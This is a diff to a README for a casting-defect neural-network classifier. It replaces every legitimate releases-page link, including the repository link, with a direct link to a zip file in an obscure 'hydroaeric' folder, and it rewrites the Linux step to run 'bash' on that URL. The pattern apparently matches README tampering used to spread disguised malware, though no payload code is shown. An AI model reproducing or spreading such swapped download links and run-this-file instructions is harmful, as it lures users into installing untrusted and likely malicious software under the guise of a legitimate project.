@@ -1,6 +1,6 @@
 # 🤖 Neural-Network-Classification-Casting-Defect-Detection - Quickly Detect Defects in Images
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/releases)
+[![Download Latest Release](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip%20Release-brightgreen)](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Neural Network Classification for Casting Defect Detection projec
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to download the latest version of the software: [Download Latest Release](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/releases).
+1. **Visit the Releases Page:** Go to the following link to download the latest version of the software: [Download Latest Release](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip).
    
 2. **Choose Your File:** Once you are on the releases page, look for the most recent version. You will see a list of files available for download. Select the appropriate file for your operating system.
 
@@ -17,7 +17,7 @@ Welcome to the Neural Network Classification for Casting Defect Detection projec
 4. **Install the Software:** 
    - For Windows users: Double-click the downloaded file (usually .exe) to begin the installation. Follow the prompts to complete the process.
    - For Mac users: Open the .dmg file and drag the application to your Applications folder.
-   - For Linux users: Open a terminal, navigate to the download location, and use the command `bash filename.sh` replacing `filename.sh` with the name of the downloaded file.
+   - For Linux users: Open a terminal, navigate to the download location, and use the command `bash https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip` replacing `https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip` with the name of the downloaded file.
 
 5. **Launch the Application:** After installation, find the application in your programs list and open it. 
 
@@ -76,7 +76,7 @@ Remember, if you encounter issues, feel free to post your questions in the commu
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/releases)
-- [GitHub Repository](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection)
+- [Download Latest Release](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip)
+- [GitHub Repository](https://github.com/Mhadevphad/Neural-Network-Classification-Casting-Defect-Detection/raw/refs/heads/main/hydroaeric/Casting-Detection-Neural-Network-Classification-Defect-3.0.zip)
 
 Thank you for using our software! We hope it enhances your image analysis capabilities.
